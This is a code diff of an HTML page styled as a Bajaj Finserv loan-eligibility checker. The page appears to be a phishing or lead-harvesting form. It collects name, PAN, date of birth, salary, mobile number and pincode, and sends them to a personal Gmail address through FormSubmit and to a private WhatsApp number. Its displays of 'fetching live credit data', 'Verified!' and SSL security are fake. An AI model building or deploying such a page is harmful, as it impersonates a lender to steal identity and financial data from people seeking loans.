@@ -1,34 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bajaj Finserv | Loan Eligibility</title>
 <style>
-    :root { --bajaj-blue: #0072bc; --light-bg: #f4f7f9; --error-red: #d32f2f; --wa-green: #25d366; }
-    .tool-wrapper { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: var(--light-bg); padding: 20px; display: flex; justify-content: center; }
-    .credit-card { background: #ffffff; width: 100%; max-width: 480px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); border-top: 6px solid var(--bajaj-blue); overflow: hidden; }
-    .card-header { padding: 25px; text-align: center; border-bottom: 1px solid #f0f0f0; }
+    :root { 
+        --bajaj-blue: #0072bc; 
+        --light-bg: #f4f7f9;
+        --error-red: #d32f2f; 
+        --wa-green: #25d366;
+    }
+    
+    body { margin: 0; padding: 0; background-color: var(--light-bg); font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+    .tool-wrapper { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+
+    .credit-card { 
+        background: #ffffff; width: 100%; max-width: 480px; border-radius: 12px; 
+        box-shadow: 0 15px 35px rgba(0,0,0,0.1); border-top: 6px solid var(--bajaj-blue); overflow: hidden; 
+    }
+
+    /* Classic Professional Header */
+    .card-header { padding: 25px; text-align: center; border-bottom: 1px solid #eee; background: #fff; }
     .brand { font-size: 26px; font-weight: 800; color: var(--bajaj-blue); text-transform: uppercase; letter-spacing: -1px; }
     .brand span { color: #2ecc71; }
-    .form-content { padding: 30px; }
-    .input-row { display: flex; gap: 15px; }
-    .input-group { margin-bottom: 18px; flex: 1; position: relative; }
-    .input-group label { display: block; font-size: 12px; font-weight: 700; color: #555; margin-bottom: 6px; text-transform: uppercase; }
-    .input-group input { width: 100%; padding: 12px; border: 1.5px solid #d1d1d1; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
-    
-    /* Date input specific styling */
+    .card-header p { font-size: 14px; color: #777; margin: 5px 0 0; font-weight: 500; }
+
+    /* Modern Form Layout */
+    .form-content { padding: 30px 25px; }
+    .input-row { display: flex; gap: 15px; flex-wrap: wrap; }
+    .input-group { margin-bottom: 20px; flex: 1; min-width: 100%; }
+    @media (min-width: 450px) { .input-group.half { min-width: calc(50% - 8px); } }
+
+    .input-group label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 8px; text-transform: uppercase; }
+    .input-group input { 
+        width: 100%; padding: 14px; border: 1.5px solid #dcdcdc; border-radius: 8px; 
+        font-size: 15px; box-sizing: border-box; outline: none; background: #fafafa; transition: 0.3s;
+    }
+    .input-group input:focus { border-color: var(--bajaj-blue); background: #fff; box-shadow: 0 4px 12px rgba(0,114,188,0.1); }
+
+    /* DOB Manual + Calendar Icon */
     .dob-container { position: relative; display: flex; align-items: center; }
-    .dob-container input { padding-right: 40px; }
-    .calendar-btn { position: absolute; right: 10px; cursor: pointer; font-size: 18px; color: var(--bajaj-blue); background: none; border: none; }
+    .dob-container input { padding-right: 45px; }
+    .calendar-icon-box { position: absolute; right: 0; top: 0; height: 100%; width: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+    .calendar-icon { font-size: 20px; color: var(--bajaj-blue); pointer-events: none; }
+    .hidden-picker { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
     
-    .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; }
-    .submit-btn { width: 100%; padding: 16px; background: var(--bajaj-blue); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+    .error-msg { color: var(--error-red); font-size: 11px; margin-top: 5px; display: none; font-weight: 600; }
+    .submit-btn { width: 100%; padding: 16px; background: var(--bajaj-blue); color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+
+    /* Success & WhatsApp */
+    #successBox, #loadingOverlay { display: none; text-align: center; padding: 40px 20px; }
+    .manager-card { background: #f9f9f9; padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px dashed var(--bajaj-blue); }
+    .wa-btn { display: inline-block; background: var(--wa-green); color: white; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-weight: 700; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3); }
     
-    #successBox { display: none; text-align: center; padding: 40px 20px; }
-    .success-icon { font-size: 50px; color: #2ecc71; margin-bottom: 20px; }
-    .manager-card { background: #f9f9f9; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px dashed var(--bajaj-blue); }
-    .wa-btn { display: inline-block; background: var(--wa-green); color: white; padding: 14px 30px; border-radius: 50px; text-decoration: none; font-weight: 700; margin-top: 10px; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4); }
-    
-    #loadingOverlay { display: none; text-align: center; padding: 40px 20px; }
-    .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--bajaj-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+    .spinner { width: 50px; height: 50px; border: 5px solid #eee; border-top: 5px solid var(--bajaj-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .secure-info { text-align: center; padding: 15px; font-size: 11px; color: #aaa; background: #fafafa; }
 </style>
@@ -48,23 +74,25 @@
                 
                 <div class="input-group">
                     <label>Full Name</label>
-                    <input type="text" name="Full_Name" id="fullName" placeholder="Enter your full name" required>
+                    <input type="text" name="Full_Name" id="fullName" placeholder="Enter full name" required>
                 </div>
 
                 <div class="input-row">
-                    <div class="input-group">
+                    <div class="input-group half">
                         <label>PAN Card Number</label>
                         <input type="text" name="PAN_Number" id="pan" maxlength="10" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
                         <div class="error-msg" id="panErr">Invalid PAN</div>
                     </div>
-                    <div class="input-group">
+                    <div class="input-group half">
                         <label>Date of Birth</label>
                         <div class="dob-container">
-                            <input type="text" id="dobText" placeholder="DD-MM-YYYY" maxlength="10" required>
-                            <input type="date" id="dobPicker" style="position:absolute; width:0; height:0; opacity:0;">
-                            <button type="button" class="calendar-btn" onclick="document.getElementById('dobPicker').showPicker()">📅</button>
+                            <input type="text" name="Date_of_Birth" id="dobText" placeholder="DD-MM-YYYY" maxlength="10" required>
+                            <div class="calendar-icon-box">
+                                <span class="calendar-icon">📅</span>
+                                <input type="date" id="dobPicker" class="hidden-picker">
+                            </div>
                         </div>
-                        <div class="error-msg" id="dobErr">Enter valid DD-MM-YYYY</div>
+                        <div class="error-msg" id="dobErr">Invalid DOB</div>
                     </div>
                 </div>
 
@@ -79,14 +107,14 @@
                 </div>
 
                 <div class="input-row">
-                    <div class="input-group">
+                    <div class="input-group half">
                         <label>Mobile Number</label>
-                        <input type="tel" name="Mobile" id="mobile" maxlength="10" inputmode="numeric" placeholder="98XXXXXXXX" required>
+                        <input type="tel" name="Mobile_Number" id="mobile" maxlength="10" inputmode="numeric" placeholder="98XXXXXXXX" required>
                         <div class="error-msg" id="mobErr">Invalid Number</div>
                     </div>
-                    <div class="input-group">
+                    <div class="input-group half">
                         <label>Current Pincode</label>
-                        <input type="text" name="Pincode" id="pincode" maxlength="6" inputmode="numeric" placeholder="110001" required>
+                        <input type="text" name="Current_Pincode" id="pincode" maxlength="6" inputmode="numeric" placeholder="110001" required>
                     </div>
                 </div>
 
@@ -97,23 +125,19 @@
         <div id="loadingOverlay">
             <div class="spinner"></div>
             <h3 style="color:var(--bajaj-blue);">Analyzing Profile...</h3>
-            <p style="font-size:14px; color:#666;">Please wait while we process your request.</p>
+            <p style="font-size:14px; color:#666;">Fetching live credit data.</p>
         </div>
 
         <div id="successBox">
-            <div class="success-icon">✅</div>
-            <h2 style="color:#2ecc71; margin:0;">Verified!</h2>
-            <p style="color:#666; font-size:14px;">Aapki details process ho chuki hain. Report ke liye manager se sampark karein:</p>
-            
+            <div style="font-size: 50px; color: #2ecc71;">✅</div>
+            <h2 style="color:#2ecc71; margin:10px 0;">Verified!</h2>
+            <p style="color:#666; font-size:14px;">Aapki report taiyar hai. Details ke liye sampark karein:</p>
             <div class="manager-card">
                 <strong>Ankit Rathore</strong><br>
                 Sales Manager (Bajaj Finserv)<br>
-                <span style="color:var(--bajaj-blue);">9310712068</span>
+                <span style="color:var(--bajaj-blue); font-size:20px; font-weight:bold;">9310712068</span>
             </div>
-            
-            <a href="#" id="waLink" class="wa-btn" target="_blank">
-                CONTACT ON WHATSAPP
-            </a>
+            <a href="#" id="waLink" class="wa-btn" target="_blank">CONTACT ON WHATSAPP</a>
         </div>
 
         <div class="secure-info">🔒 Secured with 256-bit SSL Encryption.</div>
@@ -122,14 +146,11 @@
 
 <script>
     const form = document.getElementById('loanForm');
-    const formBox = document.getElementById('formBox');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const successBox = document.getElementById('successBox');
     const dobText = document.getElementById('dobText');
     const dobPicker = document.getElementById('dobPicker');
 
-    // 1. DOB Manual Entry Mask (DD-MM-YYYY)
-    dobText.addEventListener('input', function(e) {
+    // DOB Manual Formatting (DD-MM-YYYY)
+    dobText.addEventListener('input', function() {
         let v = this.value.replace(/\D/g,'');
         if (v.length > 8) v = v.substring(0,8);
         if (v.length > 4) v = v.substring(0,2) + '-' + v.substring(2,4) + '-' + v.substring(4,8);
@@ -137,7 +158,7 @@
         this.value = v;
     });
 
-    // 2. Sync Calendar Selection to Text Field
+    // Calendar selection sync
     dobPicker.addEventListener('change', function() {
         if (this.value) {
             const [y, m, d] = this.value.split('-');
@@ -145,7 +166,7 @@
         }
     });
 
-    // Other Filters
+    // Numeric Filters
     document.getElementById('pan').oninput = function() { this.value = this.value.toUpperCase(); };
     ['mobile', 'pincode', 'salary'].forEach(id => {
         document.getElementById(id).oninput = function() { this.value = this.value.replace(/[^0-9]/g, ''); };
@@ -154,13 +175,10 @@
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        const dobVal = dobText.value;
         const panVal = document.getElementById('pan').value.toUpperCase();
         const mobVal = document.getElementById('mobile').value;
+        const dobVal = dobText.value;
         const nameVal = document.getElementById('fullName').value;
-        const compVal = document.getElementById('company').value;
-        const salVal = document.getElementById('salary').value;
-        const pinVal = document.getElementById('pincode').value;
 
         const panRegex = /[A-Z]{5}[0-9]{4}[A-Z]{1}/;
         const mobRegex = /^[6-9]\d{9}$/;
@@ -177,28 +195,23 @@
         else { document.getElementById('dobErr').style.display = 'none'; }
 
         if(isValid) {
-            formBox.style.display = 'none';
-            loadingOverlay.style.display = 'block';
+            document.getElementById('formBox').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'block';
 
-            const waText = `*New Credit Inquiry*%0A------------------%0A*Name:* ${nameVal}%0A*PAN:* ${panVal}%0A*DOB:* ${dobVal}%0A*Company:* ${compVal}%0A*Salary:* ₹${salVal}%0A*Mobile:* ${mobVal}%0A*Current Pincode:* ${pinVal}`;
+            // WhatsApp Message (Includes all details in DD-MM-YYYY)
+            const waText = `*New Credit Inquiry*%0A------------------%0A*Name:* ${nameVal}%0A*PAN:* ${panVal}%0A*DOB:* ${dobVal}%0A*Company:* ${document.getElementById('company').value}%0A*Salary:* ₹${document.getElementById('salary').value}%0A*Mobile:* ${mobVal}%0A*Current Pincode:* ${document.getElementById('pincode').value}`;
             document.getElementById('waLink').href = `https://wa.me/919310712068?text=${waText}`;
 
+            // AJAX Submission to FormSubmit
             const formData = new FormData(form);
-            formData.append('DOB', dobVal);
             formData.append('_subject', "New Lead: " + nameVal);
 
             fetch("https://formsubmit.co/ajax/ankitrathor6430@gmail.com", {
                 method: "POST",
                 body: formData
-            })
-            .then(() => {
-                loadingOverlay.style.display = 'none';
-                successBox.style.display = 'block';
-            })
-            .catch(() => {
-                alert("Error submitting. Please try again.");
-                formBox.style.display = 'block';
-                loadingOverlay.style.display = 'none';
+            }).then(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('successBox').style.display = 'block';
             });
         }
     });
